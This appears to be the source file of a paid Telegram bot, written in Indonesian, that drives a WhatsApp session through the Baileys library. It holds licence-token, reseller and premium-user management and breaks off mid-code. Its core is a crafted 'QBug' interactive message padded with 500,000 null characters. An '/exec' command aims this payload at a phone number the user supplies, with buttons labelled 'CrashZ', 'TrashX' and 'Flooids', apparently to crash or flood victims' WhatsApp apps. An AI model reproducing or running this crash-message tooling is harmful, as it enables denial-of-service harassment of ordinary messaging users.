const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const path = require('path');
const axios = require('axios');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./config");
const tdxlol = fs.readFileSync('./assets/tdx.jpeg');
const crypto = require('crypto');
const userHasRunTes = new Map();
const cooldownUsers = new Map();
const o = fs.readFileSync(`./assets/o.jpg`)
const bot = new Telegraf(BOT_TOKEN);
const GetsuZo = fs.readFileSync(`./assets/image/IvS/thumb.jpeg`)
		const GetSuZo = fs.readFileSync(`./assets/image/IvS/ViLoc.jpeg`)
let sock = null;
let isWhatsAppConnected = false;
const usePairingCode = true; 
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const dotenv = require('dotenv');
dotenv.config();
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const REPO_OWNER = process.env.REPO_OWNER;
const REPO_NAME = process.env.REPO_NAME;
const FILE_PATH = process.env.FILE_PATH;
if (!GITHUB_TOKEN || !REPO_OWNER || !REPO_NAME || !FILE_PATH) {
  throw new Error('One or more required environment variables are missing. Please check your .env file.');
}
const TOKEN_DATABASE_URL = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}?ref=main`;
async function startBot() {
  try {
    const response = await axios.get(TOKEN_DATABASE_URL, {
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`
      }
    });
    const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
    const tokensData = JSON.parse(fileContent);
    if (!tokensData.tokens || !Array.isArray(tokensData.tokens) || tokensData.tokens.length === 0) {
      console.error(chalk.red.bold("Database token kosong atau tidak valid."));
      process.exit(1);
    }
    if (!tokensData.tokens.includes(BOT_TOKEN)) {
      console.error(chalk.red.bold("Hum Token Kamu Ga Kedaftar Silahkan Buy Access @DelioGalileio."));
      process.exit(1); 
    }
    console.log(chalk.green.bold("Huhh Buyer SejatiKu."));
  } catch (error) {
    console.error(chalk.red("Terjadi kesalahan saat mengakses database token:", error));
    process.exit(1);
  }
}
startBot();
function isAllowedDeveloper(ctx) {
    return allowedDevelopers.includes(ctx.from.id);
}

const DATABASE_URL = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
async function getDatabase() {
    try {
        const response = await axios.get(DATABASE_URL, {
            headers: {
                Authorization: `token ${GITHUB_TOKEN}`,
            },
        });
        const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
        return { data: JSON.parse(fileContent), sha: response.data.sha };
    } catch (error) {
        console.error('Gagal mengambil database:', error);
        throw new Error('Gagal mengambil database.');
    }
}
async function updateDatabase(updatedData, sha) {
    try {
        const updatedContent = Buffer.from(JSON.stringify(updatedData, null, 2)).toString('base64');
        await axios.put(
            DATABASE_URL,
            {
                message: 'Memperbarui data pengguna.',
                content: updatedContent,
                sha,
            },
            {
                headers: {
                    Authorization: `token ${GITHUB_TOKEN}`,
                },
            }
        );
    } catch (error) {
        console.error('Gagal memperbarui database:', error);
        throw new Error('Gagal memperbarui database.');
    }
}
async function addResellerToDatabase(userId) {
    try {
        const { data, sha } = await getDatabase();
        if (!data.resellers) {
            data.resellers = [];
        }
        if (data.resellers.includes(userId)) {
            return false;
        }
        data.resellers.push(userId);
        await updateDatabase(data, sha);
        return true;
    } catch (error) {
        console.error('Gagal menambahkan reseller:', error);
        throw new Error('Gagal menambahkan reseller.');
    }
}
async function addTokenToDatabase(token) {
    try {
        const { data, sha } = await getDatabase();
        if (!data.tokens) {
            data.tokens = [];
        }
        if (data.tokens.includes(token)) {
            return false;
        }
        data.tokens.push(token);
        await updateDatabase(data, sha);
        return true;
    } catch (error) {
        console.error('Gagal menambahkan token:', error);
        throw new Error('Gagal menambahkan token.');
    }
}
async function removeTokenFromDatabase(token) {
    try {
        const { data, sha } = await getDatabase();
        if (!data.tokens || !data.tokens.includes(token)) {
            return false;
        }
        data.tokens = data.tokens.filter(t => t !== token);
        await updateDatabase(data, sha);
        return true;
    } catch (error) {
        console.error('Gagal menghapus token:', error);
        throw new Error('Gagal menghapus token.');
    }
}
async function listTokens(ctx) {
    const { data } = await getDatabase();
    const tokens = data.tokens || [];
    if (tokens.length === 0) {
        return ctx.reply('📂 Tidak ada token yang disimpan.');
    }
    const tokensList = tokens.map((token, index) => `${index + 1}. ${token}`).join('\n');
    ctx.reply(`📋 Daftar Token:\n${tokensList}`);
}
async function listResellers(ctx) {
    const { data } = await getDatabase();
    const resellers = data.resellers || [];
    if (resellers.length === 0) {
        return ctx.reply('📂 Tidak ada reseller yang terdaftar.');
    }
    const resellersList = resellers.map((userId, index) => `${index + 1}. ${userId}`).join('\n');
    ctx.reply(`📋 Daftar Reseller:\n${resellersList}`);
}
bot.command('resellermenu', (ctx) => {
    const inlineKeyboard = [
        [
            { text: 'King', url: 'https://t.me/DelioGalileio' },  
            { text: 'Owner', url: 'https://t.me/DelioGalileio' },  
        ]
    ];
    ctx.replyWithPhoto('https://cdn.obscura.web.id/Cat.jpg', {
        caption: `
✨ *Selamat datang di Menu Admin Bot!* ✨
Pilih opsi di bawah untuk bergabung dengan Channel atau menghubungi Owner:
✨ *Selamat datang di Menu Admin Bot!* ✨
Pilih fitur yang Anda inginkan:
1. 💎 *Tambah Reseller*: Kirimkan perintah \`/addreseller <ID Telegram>\`
2. 🔑 *Tambah Token*: Kirimkan perintah \`/addtoken <Token>\`
3. 📂 *Lihat Daftar Token*: Kirimkan perintah \`/listtokens\`
4. ❌ *Hapus Token*: Kirimkan perintah \`/removetoken <Token>\`
5. 📋 *Lihat Daftar Reseller*: Kirimkan perintah \`/listresellers\`
6. ❌ *Hapus Reseller*: Kirimkan perintah \`/removereseller <ID Telegram>\`
Terima kasih telah menggunakan bot ini!`,
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: inlineKeyboard,
        },
    });
});
async function isReseller(userId) {
    const { data } = await getDatabase();
    return data.resellers && data.resellers.includes(userId);
}
bot.command('addreseller', async (ctx) => {
        if (!isAllowedDeveloper(ctx)) {
        return ctx.reply('❌ Anda tidak memiliki izin untuk menggunakan fitur ini.');
    }
    const userId = ctx.message.text.split(' ')[1];
    if (!userId) {
        return ctx.reply('⚠️ Harap kirimkan ID Telegram yang valid.');
    }
    const success = await addResellerToDatabase(userId);
    if (success) {
        ctx.reply(`✅ Pengguna dengan ID ${userId} telah berhasil ditambahkan sebagai reseller.`);
    } else {
        ctx.reply('⚠️ Pengguna ini sudah terdaftar sebagai reseller.');
    }
});
bot.command('addtoken', async (ctx) => {
    if (!(await isReseller(ctx.from.id))) {
        return ctx.reply('❌ Hanya reseller yang dapat mengakses fitur ini.');
    }
    const token = ctx.message.text.split(' ')[1];
    if (!token) {
        return ctx.reply('⚠️ Harap kirimkan token yang valid.');
    }
    const success = await addTokenToDatabase(token);
    if (success) {
        ctx.reply(`✅ Token ${token} berhasil ditambahkan.`);
    } else {
        ctx.reply('⚠️ Token ini sudah terdaftar.');
    }
});
bot.command('listtokens', async (ctx) => {
    if (!(await isReseller(ctx.from.id))) {
        return ctx.reply('❌ Hanya reseller yang dapat mengakses fitur ini.');
    }
    listTokens(ctx);
});
bot.command('removetoken', async (ctx) => {
    if (!(await isReseller(ctx.from.id))) {
        return ctx.reply('❌ Hanya reseller yang dapat mengakses fitur ini.');
    }
    const token = ctx.message.text.split(' ')[1];
    if (!token) {
        return ctx.reply('⚠️ Harap kirimkan token yang valid untuk dihapus.');
    }
    const success = await removeTokenFromDatabase(token);
    if (success) {
        ctx.reply(`✅ Token ${token} berhasil dihapus.`);
    } else {
        ctx.reply('⚠️ Token ini tidak ditemukan.');
    }
});
bot.command('listresellers', async (ctx) => {
    listResellers(ctx);
});
bot.command('removereseller', async (ctx) => {
        if (!isAllowedDeveloper(ctx)) {
        return ctx.reply('❌ Anda tidak memiliki izin untuk menggunakan fitur ini.');
    }
    const userId = ctx.message.text.split(' ')[1];
    if (!userId) {
        return ctx.reply('⚠️ Harap kirimkan ID reseller yang valid untuk dihapus.');
    }
    const success = await removeResellerFromDatabase(userId);
    if (success) {
        ctx.reply(`✅ Reseller dengan ID ${userId} berhasil dihapus.`);
    } else {
        ctx.reply('⚠️ Reseller ini tidak ditemukan.');
    }
});
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};
const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};
const saveAdmins = () => {
    fs.writeFileSync('./json/admins.json', JSON.stringify(adminList));
};
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./json/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }
    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');
    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};
const savePremiumUsers = () => {
    fs.writeFileSync('./json/premiumUsers.json', JSON.stringify(premiumUsers));
};
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./json/premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./json/ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};
const saveDeviceList = () => {
    fs.writeFileSync('./json/ListDevice.json', JSON.stringify(deviceList));
};
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
};
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };
    fs.writeFileSync('./json/userActivity.json', JSON.stringify(userActivity));
};
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./json/userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;
    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }
    if (userId) {
        recordUserActivity(userId, userNickname);
    }
    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); 
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        await next();
    }
};
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Maaf, Anda bukan user premium. Silakan hubungi developer @DelioGalileio untuk upgrade.");
    }
};
async function saveOwnerList() {
    const ownerFilePath = path.resolve(__dirname, 'owner.json');
    fs.writeFileSync(ownerFilePath, JSON.stringify(ownerList, null, 2));
}
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();
    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), 
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', 
        }),
    };
    sock = makeWASocket(connectionOptions);
    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃   ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}
(async () => {
    console.log(chalk.whiteBright.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.yellowBright.bold('SYSTEM ANTI CRACK ACTIVE')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
    console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.yellow.bold('SUKSES MEMUAT DATABASE OWNER')}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━❍`));
    loadPremiumUsers();
    loadAdmins();
    loadDeviceList();
    loadUserActivity();
    startSesi();
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
bot.command("addpairing", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addpairing <nomor_wa>");
    }
    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
    if (!phoneNumber.startsWith('62')) {
        return await ctx.reply("❌ Nomor harus diawali dengan 62. Contoh: /addpairing 628xxxxxxxxxx");
    }
    if (sock && sock.user) {
        return await ctx.reply("ℹ️ WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }
    try {
        const code = await sock.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        const pairingMessage = `
*✅ Pairing Code WhatsApp:*
*Nomor:* ${phoneNumber}
*Kode:* ${formattedCode}
        `;
        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});
bot.command("addowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }
    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }
    ownerList.push(userId);
    await saveOwnerList();
    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.
*Detail:*
- *ID User:* ${userId}
Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;
    await ctx.replyWithMarkdown(successMessage);
});
bot.command("delowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }
    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }
    ownerList = ownerList.filter(id => id !== userId);
    await saveOwnerList();
    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.
*Detail:*
- *ID User:* ${userId}
Owner tersebut tidak lagi memiliki akses seperti owner.
    `;
    await ctx.replyWithMarkdown(successMessage);
});
bot.command("addadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addadmin <id_user>");
    }
    addAdmin(userId);
    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.
*Detail:*
- *ID User:* ${userId}
Admin baru sekarang memiliki akses ke perintah /addprem dan /delprem.
    `;
    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }
    removeAdmin(userId);
    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.
*Detail:*
- *ID User:* ${userId}
Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;
    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});
bot.action("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Maaf, Anda tidak memiliki akses untuk melihat daftar admin.");
    }
    const adminListString = adminList.length > 0
        ? adminList.map(id => `- ${id}`).join("\n")
        : "Tidak ada admin yang terdaftar.";
    const message = `
ℹ️ Daftar Admin:
${adminListString}
Total: ${adminList.length} admin.
    `;
    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addprem <id_user> <durasi_hari>");
    }
    const userId = args[1];
    const durationDays = parseInt(args[2]);
    if (isNaN(durationDays) || durationDays <= 0) {
        return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
    }
    addPremiumUser(userId, durationDays);
    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Premium User*.
*Detail:*
- *ID User:* ${userId}
- *Durasi:* ${durationDays} hari
- *Kadaluarsa:* ${formattedExpiration} WIB
Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;
    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Cek Status Premium", callback_data: `cekprem_${userId}` }]
            ]
        }
    });
});
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
    }
    if (!premiumUsers[userId]) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }
    removePremiumUser(userId);
    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.
*Detail:*
- *ID User:* ${userId}
User tersebut tidak lagi memiliki akses ke fitur premium.
    `;
    await ctx.replyWithMarkdown(successMessage);
});
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }
    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }
    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();
    const message = `
ℹ️ Status Premium User *${userId}*
*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}
Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;
    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;
    await ctx.replyWithMarkdown(deviceMessage);
});
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }
    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;
    await ctx.replyWithMarkdown(message);
});
const prosesrespone = async (target, ctx) => {
    const caption = `Process...`;
    await ctx.reply(caption)
        .then(() => {
            console.log('Proses response sent');
        })
        .catch((error) => {
            console.error('Error sending process response:', error);
        });
};
const donerespone = async (target, ctx) => {
    const caption = `Succesfully`;
    await ctx.reply(caption)
        .then(() => {
            console.log('Done response sent');
        })
        .catch((error) => {
            console.error('Error sending done response:', error);
        });
};
const checkWhatsAppConnection = async (ctx, next) => {
    if (!isWhatsAppConnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
        return;
    }
    await next();
};
const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};
bot.use(checkMaintenance); 
bot.command("cooldown", async (ctx) => {
  const userId = ctx.from.id;
  if (!cooldownUsers.has(userId)) {
    return await ctx.reply("Tidak ada cooldown aktif untuk Anda. Anda dapat menggunakan perintah sekarang.");
  }
  const remainingTime = Math.ceil((cooldownUsers.get(userId) - Date.now()) / 1000);
  if (remainingTime > 0) {
    return await ctx.reply(`Cooldown aktif. Harap tunggu ${remainingTime} detik sebelum menggunakan perintah lagi.`);
  } else {
    cooldownUsers.delete(userId);
    return await ctx.reply("Cooldown Anda sudah selesai. Anda dapat menggunakan perintah sekarang.");
  }
});
bot.command("exec", checkWhatsAppConnection, checkPremium, async ctx => {
  const userId = ctx.from.id;
  if (cooldownUsers.has(userId)) {
    const remainingTime = Math.ceil((cooldownUsers.get(userId) - Date.now()) / 1000);
    return await ctx.reply(`Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
  }
  const q = ctx.message.text.split(" ")[1];
  if (!q) {
    return await ctx.reply(`Example: /exec 62×××`);
  }
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  userHasRunTes.set(userId, target);
  const buttons = [
    [
      { text: "︎Flooids", callback_data: `trash_${target}` },
      { text: "TrashX", callback_data: `core_${target}` },
    ],
        [
      { text: "CrashZ", callback_data: `core_${target}` },
            { text: "Xcore", callback_data: `trash_${target}` }
      ],
    [
      { text: "Type IOS", callback_data: `lanjut_${target}` }
    ]
  ];
  const loadingImageUrl = "https://cdn.obscura.web.id/Cat.jpg";
  await ctx.replyWithPhoto(loadingImageUrl, {
    caption: `╭─────「 ƿᎡ᥆ƈҽʂᎦꀤꋊ𝔾 」
│⇲ Click One Of The Buttons
╰─────────────────────⊹`,
    reply_markup: {
      inline_keyboard: buttons
    }
  });
  const cooldownDuration = 60000;
  cooldownUsers.set(userId, Date.now() + cooldownDuration);
  setTimeout(() => {
    cooldownUsers.delete(userId);
  }, cooldownDuration);
});
bot.action(/lanjut_(.+)/, async (ctx) => {
  const target = ctx.match[1];
  userHasRunTes.set(ctx.from.id, target);
  const buttons = [
    [
      { text: "☎︎ 𝑰𝒐𝒔𝑿", callback_data: `iosx_${target}` },
      { text: "☏ 𝑿𝒊𝑺", callback_data: `xis_${target}` }
    ],
    [
      { text: "Kembali Android", callback_data: `back_to_crash_${target}` }
    ]
  ];
  const loadingImageUrl = "https://cdn.obscura.web.id/Cat.jpg";
  await ctx.editMessageCaption(`╭─────「 ƿᎡ᥆ƈҽʂᎦꀤꋊ𝔾 」
│⇲ Click One Of The Buttons
╰─────────────────────⊹`, {
    photo: loadingImageUrl,
    reply_markup: {
      inline_keyboard: buttons
    }
  });
});
bot.action(/back_to_crash_(.+)/, async (ctx) => {
  const target = ctx.match[1];
  const buttons = [
     [
      { text: "︎Flooids", callback_data: `trash_${target}` },
      { text: "TrashX", callback_data: `core_${target}` },
    ],
        [
